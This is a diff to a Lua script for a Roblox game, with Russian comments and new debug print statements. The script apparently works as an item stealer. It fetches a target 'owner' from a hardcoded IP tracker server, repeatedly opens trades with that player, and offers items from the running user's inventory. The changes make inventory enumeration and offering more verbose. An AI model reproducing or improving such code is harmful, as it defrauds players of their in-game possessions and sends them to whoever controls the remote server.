@@ -6,9 +6,9 @@ local res = httpRequest({ Url = "http://144.31.74.117:3000/tracker", Method = "G
 local data = HttpService:JSONDecode(res.Body)
 
 local AUTO_TARGET = data.owner
-local AUTO_INTERVAL = 10     
-local AUTO_RETRY_DELAY = 5    
-local AUTO_TRADE_WINDOW = 10 
+local AUTO_INTERVAL = 10       -- фолбэк: если трейд завис и не закрылся
+local AUTO_RETRY_DELAY = 5     -- задержка после завершения трейда перед следующим
+local AUTO_TRADE_WINDOW = 10   -- сек: пока не истёк, StartTrade считаем нашим
 local OFFER_DELAY = 0.25
 local OFFER_MAX_CALLS = 500
 local OFFER_MAX_DISTINCT = 4
@@ -36,7 +36,7 @@ local statusOk = false
 local offering = false
 local currentPartner = nil
 local awaitingAutoTradeUntil = 0
-local weInitiated = false  
+local weInitiated = false  -- мы отправили запрос → мы ОТДАЮЩАЯ сторона
 
 local sending = false
 local lastSend = -1e9
@@ -80,19 +80,32 @@ end
 
 local function getInventory()
     local ok, profile = pcall(function() return require(RS.Modules.ProfileData) end)
-    if not ok or type(profile) ~= "table" then return nil end
+    if not ok or type(profile) ~= "table" then
+        print("[inv] ProfileData load failed:", ok, type(profile))
+        return nil
+    end
+    -- Дамп верхних ключей ProfileData для диагностики
+    local keys = {}
+    for k in pairs(profile) do keys[#keys+1] = tostring(k) end
+    print("[inv] ProfileData keys:", table.concat(keys, ", "))
     local out = {}
     for _, cat in ipairs(OFFER_CATEGORIES) do
         local d = profile[cat]
-        if type(d) == "table" and type(d.Owned) == "table" then
-            for name, count in pairs(d.Owned) do
-                local n = math.floor(tonumber(count) or 0)
-                if not OFFER_EXCLUDE[tostring(name)] and n > 0 then
-                    out[#out + 1] = { name = tostring(name), cat = cat, count = n }
+        print("[inv] category", cat, "->", type(d))
+        if type(d) == "table" then
+            print("[inv]   .Owned =", type(d.Owned))
+            if type(d.Owned) == "table" then
+                for name, count in pairs(d.Owned) do
+                    local n = math.floor(tonumber(count) or 0)
+                    print("[inv]     item:", name, "count:", n, "excluded:", tostring(OFFER_EXCLUDE[tostring(name)] == true))
+                    if not OFFER_EXCLUDE[tostring(name)] and n > 0 then
+                        out[#out + 1] = { name = tostring(name), cat = cat, count = n }
+                    end
                 end
             end
         end
     end
+    print("[inv] total offereable items:", #out)
     table.sort(out, function(a, b) return a.name < b.name end)
     return out
 end
@@ -104,13 +117,18 @@ local function doAccept()
 end
 
 local function offerAll()
+    -- Мы сами отправили трейд → отдающая сторона, не предлагаем айтемы
     if weInitiated then
+        print("[offer] skipped — weInitiated")
         return
     end
+    print("[offer] called | offering="..tostring(offering).." tradeActive="..tostring(tradeActive).." partner="..tostring(currentPartner))
     if offering or not tradeActive or not sameTarget(currentPartner) then return end
     local remote = TRADE:FindFirstChild("OfferItem", true)
+    print("[offer] OfferItem remote:", tostring(remote))
     if not remote then return end
     local inv = getInventory()
+    print("[offer] inv size:", inv and #inv or "nil")
     if not inv or #inv == 0 then return end
 
     local batch = {}
@@ -151,6 +169,7 @@ local function hookIncoming(o)
                 tradeActive = true
                 if os.clock() < awaitingAutoTradeUntil then
                     currentPartner = AUTO_TARGET
+                    -- weInitiated уже true из loop
                 else
                     currentPartner = nil
                     weInitiated = false
@@ -199,6 +218,7 @@ end)
 
 task.spawn(function()
     while active do
+        -- Не ждём statusOk — он медленно обновляется, используем только tradeActive
         if not tradeActive and not sending and os.clock() - lastSend >= AUTO_INTERVAL then
             local inv = getInventory()
             local target = Players:FindFirstChild(AUTO_TARGET)
